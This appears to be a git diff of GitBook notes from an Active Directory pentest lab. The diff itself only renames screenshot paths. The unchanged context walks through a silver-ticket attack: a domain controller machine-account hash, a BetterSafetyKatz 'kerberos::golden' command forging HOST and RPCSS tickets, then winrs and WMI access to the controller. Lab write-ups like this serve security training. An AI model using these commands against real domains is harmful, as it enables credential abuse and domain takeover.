@@ -6,7 +6,7 @@ Please note that the hash of dcorp-dc$ (RC4 in the below command) may be differe
 
 In our previous path we had to copy the hash of the machine account of Dcorp-DC. You can identify it as Dcorp-DC$
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>9e81989d7ce17b7bbd3ac1e05dc94e57</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>9e81989d7ce17b7bbd3ac1e05dc94e57</p></figcaption></figure>
 
 First we start by encoding "silver" then we throw in rubeus ->
 
@@ -34,7 +34,7 @@ And now we can enter the session:
 winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd    
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -48,7 +48,7 @@ Let's start an elevated shell:
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9e81989d7ce17b7bbd3ac1e05dc94e57 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now we need to Inject a ticket for RPCSS:
 
@@ -58,7 +58,7 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:d
 
 And if we check what tickets are present with `klist:`
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 And now we could tru to run WMI commands on the domain controller:
 
@@ -67,4 +67,4 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
 ```
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
